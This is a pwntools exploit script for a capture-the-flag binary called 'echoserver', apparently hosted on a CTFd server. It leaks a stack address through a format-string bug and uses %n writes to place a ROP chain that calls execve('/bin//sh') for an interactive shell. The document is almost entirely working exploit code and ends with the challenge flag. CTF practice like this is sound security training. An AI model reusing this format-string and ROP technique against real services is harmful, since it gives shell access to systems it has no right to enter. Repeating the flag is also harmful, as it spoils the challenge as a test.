from pwn import *
elf = ELF('./echoserver', checksec=False)
def write_what_where(where, what):
    value = [
        what[-4:],
        what[-8:-4],
    ]
    for x in range(len(value)):
        if value[x] == '0000':
            continue
        payload = b''.join([
            p32(where+(x*2)),
            '%{0:d}x'.format(eval('0x' + value[x])-4).encode(),b'%5$n'
        ])
        p.sendlineafter(b'\n', payload)
        p.recvline() # clean buffer

#p = elf.process()
p = remote('challenges.ctfd.io', 30095)
p.sendlineafter(b'\n', b'%148$p')
stack = eval(p.recvline().strip())
var_14h = stack + 0x16a
numval = var_14h + 0x8
ret_addr = var_14h + 0x28
log.info('leak stack at 0x%x' % stack)
log.info('cmp value at 0x%x' % var_14h)
log.info('num value at 0x%x' % numval)
log.info('return addr at 0x%x' % ret_addr)

payload = b''.join([
    p32(numval),
    '%{0:d}x'.format(30-4).encode(),b'%5$n'
])
p.sendlineafter(b'\n', payload)

payload = [
    '080acfa6', # pop eax
    '080df010', # address bss
    '08064ca8', # pop edx
    '69622f2f', # //bi
    '080a0fb4', # mov dword ptr [eax], edx ; ret

    '080acfa6', # pop eax
    '080df014', # address bss
    '08064ca8', # pop edx
    '68732f6e', # hs/n
    '080a0fb4', # mov dword ptr [eax], edx ; ret


    '0804901e', # pop ebx
    '080df010', # address sh
    '08063ca1', # pop ecx
    'ffffffff', # -1
    '08064ca8', # pop edx
    'ffffffff', # -1
    '080acfa6', # pop eax
    '080e1000', # 0x00 => bypass test eax, eax
    '0805f880', # mov eax, [eax]
    '080740fe', # inc ecx ; inc edx ; test al, al ; jne 0x8074100 ; xor eax, eax ; ret
   
    '080acfa6', # pop eax
    '080dd810', # 0x0b
    '0805f880', # mov eax, [eax]
    '0804a7d2', # int 0x80
]
for i in range(len(payload)):
    write_what_where(ret_addr+(4*i), payload[i])
    
payload = b''.join([
    p32(var_14h),
    '%{0:d}x'.format(1).encode(),b'%5$n'
])

p.sendlineafter(b'\n', payload)
p.interactive()
# batpwn{3cho_cAm3_bAck}